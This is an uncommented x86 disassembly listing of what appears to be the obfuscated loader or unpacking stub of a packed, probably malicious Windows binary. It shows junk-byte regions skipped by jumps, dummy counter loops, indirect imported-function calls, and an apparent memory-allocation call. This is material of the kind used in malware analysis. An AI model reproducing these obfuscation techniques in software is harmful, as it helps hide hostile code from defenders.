  40b02a:	cmp    DWORD PTR ds:0x41abca,0x12
  40b031:	jae    0x40b05b
  40b037:	cmp    DWORD PTR ds:0x41abca,0x1d
  40b03e:	jne    0x40b054
  40b044:	push   0x27af
  40b049:	push   0x17d7
  40b04e:	call   DWORD PTR ds:0x40d028
  40b054:	jmp    0x40b01b
  40b059:	or     esi,edi
  40b05b:	mov    esi,0x7879
  40b060:	mov    edi,0x1556
  40b065:	mov    DWORD PTR ds:0x4235c3,0x3a32
  40b06f:	xchg   esi,ecx
  40b071:	mov    ecx,DWORD PTR ds:0x41238c
  40b077:	mov    ecx,DWORD PTR [ecx]
  40b079:	or     DWORD PTR ds:0x417e49,ecx
  40b07f:	sub    edx,edi
  40b081:	and    ecx,DWORD PTR ds:0x412368
  40b087:	xor    esi,esi
  40b089:	adc    ecx,DWORD PTR ds:0x4235bf
  40b08f:	mov    DWORD PTR [ebp-0x28],esi
  40b092:	mov    DWORD PTR [ebp-0x2c],esi
  40b095:	add    ecx,DWORD PTR ds:0x41abd6
  40b09b:	mov    DWORD PTR [ebp-0x14],esi
  40b09e:	and    DWORD PTR ds:0x41510d,ebx
  40b0a4:	jmp    0x40b189
  40b0a9:	scas   al,BYTE PTR es:[edi]
  40b0aa:	mov    ch,0x8b
  40b0ac:	imul   edi,DWORD PTR [ecx+0x69],0x6e
  40b0b0:	pop    ecx
  40b0b1:	(bad)  
  40b0b2:	pusha  
  40b0b3:	fisttp WORD PTR [ecx-0x6b]
  40b0b6:	jmp    0x7e7e:0x3fc97f60
  40b0bd:	mov    dh,0x7e
  40b0bf:	jle    0x40b13f
  40b0c1:	add    edx,DWORD PTR [edi+0x2c4a9650]
  40b0c7:	hlt    
  40b0c8:	jo     0x40b13e
  40b0ca:	ror    DWORD PTR [ecx+0x69],1
  40b0cd:	sbb    eax,0x158367e0
  40b0d2:	sbb    esi,edi
  40b0d4:	leave  
  40b0d5:	mov    ah,0x80
  40b0d7:	push   ss
  40b0d8:	pop    edi
  40b0d9:	mov    ds,ebx
  40b0db:	mov    dh,0xe2
  40b0dd:	fdiv   DWORD PTR [ebx+esi*8+0x53]
  40b0e1:	jl     0x40b12f
  40b0e3:	cdq    
  40b0e4:	pop    eax
  40b0e5:	retf   
  40b0e6:	loopne 0x40b0c4
  40b0e8:	jne    0x40b167
  40b0ea:	fstp   DWORD PTR [esi]
  40b0ec:	mov    eax,0x549b3cc2
  40b0f1:	inc    ebx
  40b0f2:	sbb    al,BYTE PTR [edi-0x54]
  40b0f5:	sbb    al,0xe
  40b0f7:	inc    esp
  40b0f8:	sar    BYTE PTR [eax],cl
  40b0fa:	sub    BYTE PTR [esi-0x3f],0xb8
  40b0fe:	out    0x5d,eax
  40b100:	or     dl,dh
  40b102:	mov    cl,0xe5
  40b104:	jbe    0x40b0f1
  40b106:	cli    
  40b107:	push   es
  40b108:	fwait
  40b109:	lahf   
  40b10a:	int    0xad
  40b10c:	ss xchg ecx,eax
  40b10e:	lods   eax,DWORD PTR ds:[esi]
  40b10f:	int    0x6e
  40b111:	adc    DWORD PTR [eax+0x22],0x4c
  40b115:	sahf   
  40b116:	jg     0x40b0d7
  40b118:	jns    0x40b0bf
  40b11a:	les    edx,FWORD PTR [ebx]
  40b11c:	adc    ebp,DWORD PTR [edi+edx*2-0x4573ab5f]
  40b123:	lods   al,BYTE PTR ds:[esi]
  40b124:	mov    esp,0xa1757ed
  40b129:	inc    eax
  40b12a:	inc    edx
  40b12b:	sub    DWORD PTR ds:[ecx],edi
  40b12e:	mov    esp,0xbdd8da7a
  40b133:	inc    edi
  40b134:	cld    
  40b135:	jl     0x40b170
  40b137:	outs   dx,DWORD PTR ds:[esi]
  40b138:	push   eax
  40b139:	sbb    ebx,DWORD PTR [ebp+ebx*8+0x51e949ba]
  40b140:	jmp    0xfc9c:0x6588dedd
  40b147:	jo     0x40b0d7
  40b149:	jg     0x40b1c3
  40b14b:	scas   eax,DWORD PTR es:[edi]
  40b14c:	pslld  mm7,QWORD PTR [ebx-0x6a]
  40b150:	arpl   WORD PTR [eax*2-0x6e81ceff],di
  40b157:	test   ebp,esi
  40b159:	adc    cl,dh
  40b15b:	or     DWORD PTR [eax-0x79e23a1f],0x3f
  40b162:	push   0xfffffff3
  40b164:	inc    edi
  40b165:	mov    bh,0x1a
  40b167:	jle    0x40b162
  40b169:	js     0x40b150
  40b16b:	xor    eax,0x79bb8110
  40b170:	dec    eax
  40b171:	(bad)  
  40b172:	(bad)  
  40b173:	pop    eax
  40b174:	call   0x132d2efe
  40b179:	lea    edi,[ecx-0x1f]
  40b17c:	xchg   ecx,eax
  40b17d:	rol    DWORD PTR [edx-0x3ff0859d],1
  40b183:	add    edx,edi
  40b185:	outs   dx,BYTE PTR ds:[esi]
  40b186:	retf   0xc54a
  40b189:	mov    DWORD PTR [ebp-0x8],esi
  40b18c:	movzx  ecx,BYTE PTR ds:0x41abce
  40b193:	and    DWORD PTR ds:0x415115,ecx
  40b199:	jmp    0x40b27e
  40b19e:	mov    ebp,0xc5aa0686
  40b1a3:	stos   BYTE PTR es:[edi],al
  40b1a4:	popa   
  40b1a5:	jns    0x40b1e6
  40b1a7:	in     eax,dx
  40b1a8:	(bad)  
  40b1a9:	mov    ah,0xaf
  40b1ab:	push   edi
  40b1ac:	in     eax,dx
  40b1ad:	das    
  40b1ae:	add    DWORD PTR [esi+edi*2],edi
  40b1b1:	jle    0x40b169
  40b1b3:	jle    0x40b233
  40b1b5:	jle    0x40b1f1
  40b1b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1b8:	push   0xf6831fab
  40b1bd:	jp     0x40b1cf
  40b1bf:	mov    ah,0xfc
  40b1c1:	dec    edx
  40b1c2:	ds sub eax,0x1609d2cb
  40b1c8:	pop    edx
  40b1c9:	out    dx,eax
  40b1ca:	pop    eax
  40b1cb:	mov    ecx,0xbda0417e
  40b1d0:	xlat   BYTE PTR ds:[ebx]
  40b1d1:	out    0x31,al
  40b1d3:	std    
  40b1d4:	inc    esi
  40b1d5:	adc    BYTE PTR ds:0xedf7596b,ah
  40b1db:	sti    
  40b1dc:	lahf   
  40b1dd:	pop    ebx
  40b1de:	sbb    al,0xf3
  40b1e0:	and    ecx,DWORD PTR [ecx+ecx*2]
  40b1e3:	cmp    ch,BYTE PTR [ecx]
  40b1e5:	call   0xbcb55444
  40b1ea:	sbb    BYTE PTR [ebp+0x25],bl
  40b1ed:	test   DWORD PTR [esi+eiz*8+0x48],edi
  40b1f1:	div    DWORD PTR ds:0x349bbfef
  40b1f7:	in     eax,0xe4
  40b1f9:	dec    ecx
  40b1fa:	mov    ebx,0x82fd3fe7
  40b1ff:	gs mov eax,0x2cc11f06
  40b205:	pop    edi
  40b206:	sub    BYTE PTR [esp+edi*2+0x6a0a4426],0x9b
  40b20e:	sbb    edx,ebx
  40b210:	nop
  40b211:	(bad)  
  40b212:	in     eax,dx
  40b213:	in     al,0x92
  40b215:	scas   al,BYTE PTR es:[edi]
  40b216:	mov    ah,0x21
  40b218:	jmp    ebx
  40b21a:	dec    DWORD PTR [edx-0x15e14d16]
  40b220:	mov    edi,DWORD PTR [ebp-0x2c5f047d]
  40b226:	std    
  40b227:	inc    esp
  40b228:	lods   al,BYTE PTR ds:[esi]
  40b229:	jb     0x40b220
  40b22b:	std    
  40b22c:	ror    DWORD PTR [edi+0x3f43c2bf],1
  40b232:	cmp    al,0x1d
  40b234:	lods   al,BYTE PTR ds:[esi]
  40b235:	and    bh,BYTE PTR [eax+0x38]
  40b238:	and    edi,ebx
  40b23a:	lahf   
  40b23b:	outs   dx,BYTE PTR ds:[esi]
  40b23c:	pop    es
  40b23d:	bnd ret 0x8d5e
  40b241:	sbb    dh,BYTE PTR [edi-0x6dab5350]
  40b247:	and    BYTE PTR [eax],ch
  40b249:	mov    edi,DWORD PTR [ecx]
  40b24b:	mov    edi,0x9f9d97a9
  40b250:	cmp    BYTE PTR [ebx],ch
  40b252:	aaa    
  40b253:	cld    
  40b254:	jmp    0x68b8:0xf459f95b
  40b25b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b25c:	test   al,0x14
  40b25e:	sub    al,0x60
  40b260:	inc    esi
  40b261:	stos   BYTE PTR es:[edi],al
  40b262:	(bad)
  40b266:	imul   eax,DWORD PTR [edi-0x47],0xd8217837
  40b26d:	retf   
  40b26e:	mov    dl,0xa
  40b270:	(bad)  
  40b271:	push   esi
  40b272:	stos   DWORD PTR es:[edi],eax
  40b273:	add    DWORD PTR [eax-0x5f069188],edi
  40b279:	or     BYTE PTR [ecx+edx*1+0x4d8b4d56],cl
  40b280:	call   0x513de006
  40b285:	inc    ecx
  40b286:	add    dl,bl
  40b288:	stos   DWORD PTR es:[edi],eax
  40b289:	inc    ecx
  40b28a:	add    BYTE PTR [ebx],dh
  40b28c:	enter  0xff33,0x9
  40b290:	cmp    eax,0x41236c
  40b295:	add    ecx,ebx
  40b297:	not    eax
  40b299:	mov    DWORD PTR [ebp-0x20],ecx
  40b29c:	mov    eax,DWORD PTR [ebp-0x20]
  40b29f:	je     0x40bb71
  40b2a5:	mov    eax,ds:0x415105
  40b2aa:	xor    DWORD PTR ds:0x412354,eax
  40b2b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b2b3:	xor    eax,0x7510859
  40b2b8:	and    DWORD PTR ds:0x4235bf,0x412358
  40b2c2:	add    eax,ebx
  40b2c4:	mov    DWORD PTR ds:0x4235bf,0x20c7
  40b2ce:	cmp    edi,eax
  40b2d0:	jmp    0x40b3b5
  40b2d5:	push   edi
  40b2d6:	pop    es
  40b2d7:	popf   
  40b2d8:	aam    0x6d
  40b2da:	fs push edi
  40b2dc:	test   DWORD PTR [edx+0x2ae65a33],edx
  40b2e2:	fcmovb st,st(6)
  40b2e4:	push   0x59
  40b2e6:	cmp    al,0x7e
  40b2e8:	jle    0x40b2a0
  40b2ea:	jle    0x40b36a
  40b2ec:	jle    0x40b279
  40b2ee:	pop    esp
  40b2ef:	pop    esp
  40b2f0:	sbb    al,BYTE PTR [eax-0x38]
  40b2f3:	shl    ah,1
  40b2f5:	adc    al,0xff
  40b2f7:	jmp    0x40b2c2
  40b2f9:	fwait
  40b2fa:	dec    eax
  40b2fb:	mov    bl,0xab
  40b2fd:	ins    DWORD PTR es:[edi],dx
  40b2fe:	mov    esp,DWORD PTR [eax+0x50]
  40b301:	nop
  40b302:	loope  0x40b364
  40b304:	ins    DWORD PTR es:[edi],dx
  40b305:	fld    TBYTE PTR [eax+esi*4]
  40b308:	jp     0x40b31a
  40b30a:	loopne 0x40b315
  40b30c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b30e:	xchg   ecx,eax
  40b30f:	dec    edx
  40b310:	add    al,0x53
  40b312:	leave  
  40b313:	sar    DWORD PTR [ebx],1
  40b315:	sti    
  40b316:	mov    BYTE PTR [edi-0x6fc10342],ch
  40b31c:	mov    ecx,0x21eda18a
  40b321:	jne    0x40b30a
  40b323:	jne    0x40b312
  40b325:	out    0xb9,al
  40b327:	ret    0x75dc
  40b32a:	and    BYTE PTR [ecx+0x6d],ah
  40b32d:	out    0xbd,al
  40b32f:	sub    esp,DWORD PTR [ebx+eiz*2+0x11]
  40b333:	dec    edi
  40b334:	popa   
  40b335:	data16 test BYTE PTR [ebp+0x70a81cfd],dl
  40b33c:	xor    eax,0xdea3cad7
  40b341:	jp     0x40b32b
  40b343:	sbb    esi,ebp
  40b345:	pop    ds
  40b346:	inc    esi
  40b347:	mov    al,0x10
  40b349:	je     0x40b39c
  40b34b:	xchg   edi,eax
  40b34c:	xor    eax,0x4623176f
  40b351:	dec    esi
  40b352:	loopne 0x40b373
  40b354:	out    0x7,eax
  40b356:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b358:	add    BYTE PTR [ebp+edi*1-0x6d73d0e0],dl
  40b35f:	mov    ah,0xb2
  40b361:	mov    esp,0xba744654
  40b366:	xchg   esp,eax
  40b367:	sub    al,0x7f
  40b369:	sbb    BYTE PTR [ebx-0x69ebae5b],0xe7
  40b370:	pusha  
  40b371:	inc    ecx
  40b372:	inc    ebx
  40b373:	iret   
  40b374:	mov    eax,ds:0x8c41f7d8
  40b379:	pusha  
  40b37a:	fwait
  40b37b:	cdq    
  40b37c:	sub    DWORD PTR [eax-0x24],ebx
  40b37f:	sub    DWORD PTR [ecx+0x59fc4c9a],ecx
  40b385:	cmp    dl,BYTE PTR [eax+0x1088e6a6]
  40b38b:	stos   DWORD PTR es:[edi],eax
  40b38c:	loope  0x40b322
  40b38e:	ror    bl,1
  40b390:	push   edi
  40b391:	xor    cl,BYTE PTR [edi+0x50f08735]
  40b397:	jmp    0x20da7bc5
  40b39c:	jnp    0x40b390
  40b39e:	fwait
  40b39f:	inc    eax
  40b3a0:	push   ss
  40b3a1:	ja     0x40b3c0
  40b3a3:	call   0x314c:0x687e5c05
  40b3aa:	jp     0x40b3e9
  40b3ac:	(bad)  
  40b3ad:	and    esp,DWORD PTR [ebx-0x26a45938]
  40b3b3:	pop    esp
  40b3b4:	dec    ecx
  40b3b5:	jne    0x40b94a
  40b3bb:	push   DWORD PTR [ebp+0x8]
  40b3be:	mov    DWORD PTR ds:0x41abe2,0x7935
  40b3c8:	call   0x40a5e1
  40b3cd:	and    DWORD PTR ds:0x41237c,0x0
  40b3d7:	jmp    0x40b3eb
  40b3dc:	xor    ecx,ecx
  40b3de:	add    ecx,DWORD PTR ds:0x41237c
  40b3e4:	inc    ecx
  40b3e5:	mov    DWORD PTR ds:0x41237c,ecx
  40b3eb:	cmp    DWORD PTR ds:0x41237c,0x18
  40b3f2:	jae    0x40b452
  40b3f8:	cmp    DWORD PTR ds:0x41237c,0x24
  40b3ff:	jne    0x40b40e
  40b405:	push   DWORD PTR [ebp-0x14]
  40b408:	call   DWORD PTR ds:0x40d02c
  40b40e:	jmp    0x40b3dc
  40b413:	mov    DWORD PTR ds:0x415101,0x17
  40b41d:	cmp    DWORD PTR ds:0x415101,0x0
  40b424:	je     0x40b452
  40b42a:	cmp    DWORD PTR ds:0x415101,0x1d
  40b431:	jne    0x40b440
  40b437:	push   DWORD PTR [ebp-0xc]
  40b43a:	call   DWORD PTR ds:0x40d3a4
  40b440:	mov    esi,DWORD PTR ds:0x415101
  40b446:	dec    esi
  40b447:	mov    DWORD PTR ds:0x415101,esi
  40b44d:	jmp    0x40b41d
  40b452:	mov    DWORD PTR [ebp-0x20],eax
  40b455:	and    DWORD PTR ds:0x4235d3,0x0
  40b45f:	mov    eax,ds:0x4235d3
  40b464:	inc    eax
  40b465:	mov    ds:0x4235d3,eax
  40b46a:	cmp    DWORD PTR ds:0x4235d3,0x6
  40b471:	jne    0x40b485
  40b477:	push   DWORD PTR [ebp-0x10]
  40b47a:	push   0x41ad5b
  40b47f:	call   DWORD PTR ds:0x40d20c
  40b485:	cmp    DWORD PTR ds:0x4235d3,0x5
  40b48c:	jne    0x40b4a0
  40b492:	xor    eax,eax
  40b494:	or     eax,DWORD PTR ds:0x4235d3
  40b49a:	inc    eax
  40b49b:	mov    ds:0x4235d3,eax
  40b4a0:	cmp    DWORD PTR ds:0x4235d3,0x15
  40b4a7:	jb     0x40b45f
  40b4ad:	mov    DWORD PTR ds:0x41abca,0x15
  40b4b7:	cmp    DWORD PTR ds:0x41abca,0x0
  40b4be:	je     0x40b50b
  40b4c4:	cmp    DWORD PTR ds:0x41abca,0x22
  40b4cb:	jne    0x40b4f1
  40b4d1:	push   DWORD PTR [ebp-0x14]
  40b4d4:	push   DWORD PTR [ebp-0xc]
  40b4d7:	push   DWORD PTR [ebp-0x18]
  40b4da:	push   DWORD PTR [ebp-0x14]
  40b4dd:	push   DWORD PTR [ebp-0x1c]
  40b4e0:	push   DWORD PTR [ebp-0x1c]
  40b4e3:	push   0x15ca
  40b4e8:	push   DWORD PTR [ebp-0x28]
  40b4eb:	call   DWORD PTR ds:0x40d030
  40b4f1:	xor    ecx,ecx
  40b4f3:	or     ecx,DWORD PTR ds:0x41abca
  40b4f9:	dec    ecx
  40b4fa:	mov    DWORD PTR ds:0x41abca,ecx
  40b500:	jmp    0x40b4b7
  40b505:	sbb    DWORD PTR ds:0x41abd6,edi
  40b50b:	mov    eax,DWORD PTR [ebp-0x4]
  40b50e:	mov    ecx,DWORD PTR [ebp-0x20]
  40b511:	not    esi
  40b513:	mov    esi,0x7510859
  40b518:	xor    eax,esi
  40b51a:	sub    DWORD PTR ds:0x4235c7,0x7cc8
  40b524:	add    eax,ebx
  40b526:	cmp    ecx,eax
  40b528:	jmp    0x40b60d
  40b52d:	add    edi,ebx
  40b52f:	or     al,0xde
  40b531:	in     al,0xe9
  40b533:	loope  0x40b530
  40b535:	js     0x40b579
  40b537:	dec    ebp
  40b538:	inc    edi
  40b539:	out    dx,eax
  40b53a:	mov    ebx,0x3d91f0fc
  40b53f:	jle    0x40b5bf
  40b541:	mov    dh,0x7e
  40b543:	jle    0x40b5c3
  40b545:	lock hlt 
  40b547:	add    ebp,ebx
  40b549:	sbb    bh,BYTE PTR [ecx+0x1398d764]
  40b54f:	and    al,0x90
  40b551:	mov    ecx,0xeead4d42
  40b556:	ficomp WORD PTR [esi-0x6b]
  40b559:	and    ebp,DWORD PTR [esi-0x6882499e]
  40b55f:	cld    
  40b560:	outs   dx,DWORD PTR ds:[esi]
  40b561:	and    ebp,DWORD PTR [esi+0x50]
  40b564:	mov    al,0xea
  40b566:	js     0x40b51f
  40b568:	pushf  
  40b569:	dec    DWORD PTR [edi+0x4c]
  40b56c:	adc    al,0x21
  40b56e:	push   ss
  40b56f:	mov    bl,0x19
  40b571:	cmp    DWORD PTR [edx+eiz*4+0x5564c43],0x11
  40b579:	sar    DWORD PTR [eax-0x54042943],1
  40b57f:	cmp    BYTE PTR [ebx+edx*4-0x1b],dh
  40b583:	adc    al,0x50
  40b585:	mov    esp,0x8158385e
  40b58a:	call   0xde53c5ac
  40b58f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b590:	add    eax,0xe44353da
  40b595:	test   dl,0x4f
  40b598:	leave  
  40b599:	stos   BYTE PTR es:[edi],al
  40b59a:	mov    ebx,0xad2c4c06
  40b59f:	add    ah,dl
  40b5a1:	(bad)  
  40b5a3:	test   al,0x5c
  40b5a5:	call   0x553f:0xe38c3f38
  40b5ac:	jnp    0x40b5f5
  40b5ae:	push   esi
  40b5af:	pop    edi
  40b5b0:	xchg   esi,eax
  40b5b1:	nop
  40b5b2:	out    0xc5,al
  40b5b4:	cld    
  40b5b5:	ins    DWORD PTR es:[edi],dx
  40b5b6:	mov    esi,0x76eeade0
  40b5bb:	mov    esi,0x1c8e174c
  40b5c0:	cld    
  40b5c1:	std    
  40b5c2:	icebp  
  40b5c3:	stos   DWORD PTR es:[edi],eax
  40b5c4:	dec    ecx
  40b5c5:	or     esi,DWORD PTR [edx]
  40b5c7:	add    bh,BYTE PTR [edx-0x390ac91a]
  40b5cd:	out    dx,ax
  40b5cf:	jmp    DWORD PTR [edi]
  40b5d1:	retf   0x485e
  40b5d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5d5:	repz cli 
  40b5d7:	clc    
  40b5d8:	cdq    
  40b5d9:	cmp    dh,dh
  40b5db:	repnz dec esp
  40b5dd:	add    DWORD PTR [eax+eiz*2-0x39],0xffffffca
  40b5e2:	dec    ebp
  40b5e3:	lock jmp 0x40b619
  40b5e6:	fdivrp st(0),st
  40b5e8:	add    bl,al
  40b5ea:	popf   
  40b5eb:	test   BYTE PTR [ecx-0x8],ah
  40b5ee:	mov    esp,0x1a635239
  40b5f3:	or     esp,DWORD PTR [edx+0x3fc80300]
  40b5f9:	xchg   ebx,eax
  40b5fa:	std    
  40b5fb:	push   edi
  40b5fc:	sbb    al,0x2f
  40b5fe:	push   0x3fd92b81
  40b603:	xor    BYTE PTR [ecx+0x26],dl
  40b606:	pop    ebp
  40b607:	jg     0x40b58c
  40b609:	out    0x76,al
  40b60b:	adc    al,0x38
  40b60d:	je     0x40bb55
  40b613:	sbb    DWORD PTR ds:0x415115,0x412368
  40b61d:	push   DWORD PTR [ebp-0x20]
  40b620:	jmp    0x40b705
  40b625:	sti    
  40b626:	loopne 0x40b67d
  40b628:	lock push ebp
  40b62a:	cdq    
  40b62b:	sti    
  40b62c:	jns    0x40b666
  40b62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62f:	pop    ecx
  40b630:	out    0x6e,al
  40b632:	mov    eax,ds:0x32e93c20
  40b637:	jle    0x40b6b7
  40b639:	mov    dh,0x7e
  40b63b:	jle    0x40b6bb
  40b63d:	and    ah,BYTE PTR [eax+0x67]
  40b640:	mov    ebp,0xc9b18e32
  40b645:	pop    ebp
  40b646:	mov    ch,0xd3
  40b648:	mov    cl,0x54
  40b64a:	addr16 or eax,0xf5182fbf
  40b650:	enter  0x7517,0xc8
  40b654:	adc    eax,0x6d04b80a
  40b659:	pusha  
  40b65a:	push   0x63ad7174
  40b65f:	aas    
  40b660:	push   0xffffff85
  40b662:	push   ebx
  40b663:	and    BYTE PTR [eax-0x27],ch
  40b666:	(bad)  [edi]
  40b668:	outs   dx,DWORD PTR ds:[esi]
  40b669:	push   cs
  40b66a:	xchg   ebx,eax
  40b66b:	xlat   BYTE PTR ds:[ebx]
  40b66c:	sbb    DWORD PTR [ecx+0x1946f223],esi
  40b672:	cmp    DWORD PTR [esi],edi
  40b674:	fisubr DWORD PTR [ecx+esi*4+0x50]
  40b678:	test   ah,dh
  40b67a:	call   0xf1b4fdf9
  40b67f:	in     eax,0xb7
  40b681:	mov    ebx,0x77f149ea
  40b686:	fs (bad) 
  40b688:	je     0x40b64f
  40b68a:	repz int 0x93
  40b68d:	add    dl,ch
  40b68f:	or     esp,ebx
  40b691:	leave  
  40b692:	in     al,0xf1
  40b694:	adc    BYTE PTR [edi+0xa],al
  40b697:	mov    WORD PTR [ecx+0x6e],gs
  40b69a:	out    dx,eax
  40b69b:	dec    esp
  40b69c:	(bad)  
  40b69d:	push   esp
  40b69e:	and    eax,0xf6a811c0
  40b6a3:	dec    ecx
  40b6a4:	ret    0x64e1
  40b6a7:	dec    esp
  40b6a8:	push   cs
  40b6a9:	cmp    ebp,ecx
  40b6ab:	mov    ah,BYTE PTR [edx]
  40b6ad:	dec    ecx
  40b6ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6af:	inc    ebp
  40b6b0:	push   edi
  40b6b1:	int    0x28
  40b6b3:	cmp    esp,esi
  40b6b5:	adc    DWORD PTR [esi+0x44],edi
  40b6b8:	cmp    ah,BYTE PTR [edx-0x4a]
  40b6bb:	mov    eax,0x64f43460
  40b6c0:	add    al,0x75
  40b6c2:	xchg   ebp,eax
  40b6c3:	ret    0x406
  40b6c6:	ret    
  40b6c7:	je     0x40b72e
  40b6c9:	and    eax,esp
  40b6cb:	fldenv [ebx-0x18]
  40b6ce:	push   ebx
  40b6cf:	retf   
  40b6d0:	sub    eax,0x18fedd92
  40b6d5:	(bad)  
  40b6d6:	push   0xffffffb2
  40b6d8:	mov    ah,0xbf
  40b6da:	pop    edx
  40b6db:	cmp    esp,DWORD PTR [esi-0x47]
  40b6de:	jl     0x40b73c
  40b6e0:	scas   eax,DWORD PTR es:[edi]
  40b6e1:	xor    al,al
  40b6e3:	adc    eax,DWORD PTR [eax+0x7df49abd]
  40b6e9:	cmp    eax,0x4e44ac75
  40b6ee:	sbb    ebx,DWORD PTR [eax+0xe]
  40b6f1:	or     al,0x15
  40b6f3:	mov    BYTE PTR es:[esi+0x176d6a74],bh
  40b6fa:	xor    eax,0xf4bcd3a8
  40b6ff:	inc    esi
  40b700:	ror    DWORD PTR [ebx-0x1741cf],cl
  40b706:	jne    0x40b710
  40b708:	call   0x40a6ca
  40b70d:	or     DWORD PTR ds:0x41abde,edi
  40b713:	mov    DWORD PTR [ebp-0x14],eax
  40b716:	mov    eax,DWORD PTR [ebp-0x4]
  40b719:	adc    ecx,DWORD PTR ds:0x412370
  40b71f:	mov    ecx,DWORD PTR [ebp-0x14]
  40b722:	adc    DWORD PTR ds:0x4235cb,0x45e4
  40b72c:	xor    eax,esi
  40b72e:	add    eax,ebx
  40b730:	mov    DWORD PTR ds:0x415111,0x202e
  40b73a:	cmp    ecx,eax
  40b73c:	mov    DWORD PTR ds:0x412364,0x4412
  40b746:	je     0x40bb55
  40b74c:	and    DWORD PTR ds:0x417e49,0x0
  40b756:	mov    eax,ds:0x417e49
  40b75b:	inc    eax
  40b75c:	mov    ds:0x417e49,eax
  40b761:	cmp    DWORD PTR ds:0x417e49,0x22
  40b768:	jne    0x40b798
  40b76e:	push   0x415115
  40b773:	push   0x2bf6
  40b778:	push   DWORD PTR [ebp-0x14]
  40b77b:	push   0x415111
  40b780:	push   DWORD PTR [ebp-0x10]
  40b783:	push   0x41adfd
  40b788:	push   0x4def
  40b78d:	push   0x3000
  40b792:	call   DWORD PTR ds:0x40d210
  40b798:	cmp    DWORD PTR ds:0x417e49,0x12
  40b79f:	jb     0x40b756
  40b7a5:	mov    eax,DWORD PTR [ebp-0x14]
  40b7a8:	mov    eax,DWORD PTR [eax+0x18]
  40b7ab:	movzx  ecx,BYTE PTR ds:0x417e4d
  40b7b2:	sbb    DWORD PTR ds:0x41237c,ecx
  40b7b8:	mov    DWORD PTR [ebp-0x20],eax
  40b7bb:	xor    eax,eax
  40b7bd:	or     eax,DWORD PTR ds:0x412390
  40b7c3:	xor    ecx,ecx
  40b7c5:	xor    ecx,DWORD PTR ds:0x417eaa
  40b7cb:	sub    ecx,eax
  40b7cd:	sub    eax,DWORD PTR [eax+ecx*1]
  40b7d0:	mov    eax,DWORD PTR [ebp-0x14]
  40b7d3:	sub    DWORD PTR ds:0x4235c7,0x1830
  40b7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  40b7e0:	add    DWORD PTR ds:0x41235c,0x415101
  40b7ea:	add    ecx,DWORD PTR [eax+0x20]
  40b7ed:	mov    DWORD PTR [ebp-0x28],ecx
  40b7f0:	mov    DWORD PTR ds:0x417e59,0x1f
  40b7fa:	cmp    DWORD PTR ds:0x417e59,0x0
  40b801:	je     0x40b84b
  40b807:	cmp    DWORD PTR ds:0x417e59,0xf
  40b80e:	jne    0x40b823
  40b814:	push   DWORD PTR [ebp-0x1c]
  40b817:	push   DWORD PTR [ebp-0x10]
  40b81a:	push   DWORD PTR [ebp-0x28]
  40b81d:	call   DWORD PTR ds:0x40d034
  40b823:	cmp    DWORD PTR ds:0x417e59,0x10
  40b82a:	jne    0x40b83b
  40b830:	mov    eax,ds:0x417e59
  40b835:	dec    eax
  40b836:	mov    ds:0x417e59,eax
  40b83b:	mov    eax,ds:0x417e59
  40b840:	dec    eax
  40b841:	mov    ds:0x417e59,eax
  40b846:	jmp    0x40b7fa
  40b84b:	mov    eax,DWORD PTR [ebp-0x14]
  40b84e:	mov    ecx,DWORD PTR [ebp+0x8]
  40b851:	add    ecx,DWORD PTR [eax+0x24]
  40b854:	jmp    0x40b939
  40b859:	mov    ch,0x76
  40b85b:	or     DWORD PTR [ecx+ecx*2+0x59],eax
  40b85f:	pop    ecx
  40b860:	pop    es
  40b861:	aas    
  40b862:	mov    edx,0xdad523e6
  40b867:	sbb    al,0xb0
  40b869:	and    DWORD PTR [ebx],esi
  40b86b:	jle    0x40b8eb
  40b86d:	mov    dh,0x7e
  40b86f:	jle    0x40b8ef
  40b871:	mov    WORD PTR [eax+0x65],es
  40b874:	outs   dx,BYTE PTR ds:[esi]
  40b875:	ins    BYTE PTR es:[edi],dx
  40b876:	push   ebp
  40b877:	int    0xef
  40b879:	jp     0x40b869
  40b87b:	in     eax,0xc4
  40b87d:	fwait
  40b87e:	push   ds
  40b87f:	push   ebp
  40b880:	xor    BYTE PTR [ecx+edx*8-0x4a3faa00],al
  40b887:	int3   
  40b888:	lea    ebp,[esi-0x6f]
  40b88b:	push   ds
  40b88c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b88d:	outs   dx,DWORD PTR ds:[esi]
  40b88e:	nop
  40b88f:	mov    ss:0x3b7ddca7,eax
  40b895:	mov    ebx,0xfb72d0d3
  40b89a:	fsubr  QWORD PTR [ebx+0x3]
  40b89d:	sbb    eax,0x7eb33715
  40b8a2:	jp     0x40b8b1
  40b8a4:	sar    cl,0x6a
  40b8a7:	daa    
  40b8a8:	mov    al,ds:0x3f98b455
  40b8ad:	push   0xffffffdf
  40b8af:	cld    
  40b8b0:	inc    ebx
  40b8b1:	push   esi
  40b8b2:	or     BYTE PTR [ecx+ebp*4+0x44],0xce
  40b8b7:	rcr    DWORD PTR [ebp-0x7b],1
  40b8ba:	rcr    bh,0xef
  40b8bd:	fsubr  QWORD PTR [eax+0x2402818b]
  40b8c3:	sahf   
  40b8c4:	xchg   esi,eax
  40b8c5:	(bad)  
  40b8c6:	or     al,0x65
  40b8c8:	xchg   ecx,eax
  40b8c9:	sbb    dl,ch
  40b8cb:	add    eax,0xb27ba9c3
  40b8d0:	pop    esi
  40b8d1:	lock fisttp WORD PTR [ebp-0x622beb30]
  40b8d8:	inc    esp
  40b8d9:	mov    cs,WORD PTR [edi]
  40b8db:	rol    DWORD PTR [ebx+edx*1-0x520af93c],1
  40b8e2:	jbe    0x40b8d3
  40b8e4:	push   esp
  40b8e5:	inc    esi
  40b8e6:	add    esi,DWORD PTR [ecx-0x41]
  40b8e9:	hlt    
  40b8ea:	adc    ecx,ecx
  40b8ec:	imul   ebp,DWORD PTR [esi],0x7a
  40b8ef:	sbb    ch,BYTE PTR [ecx+0x4398ab6b]
  40b8f5:	xlat   BYTE PTR ds:[ebx]
  40b8f6:	ins    DWORD PTR es:[edi],dx
  40b8f7:	pop    edx
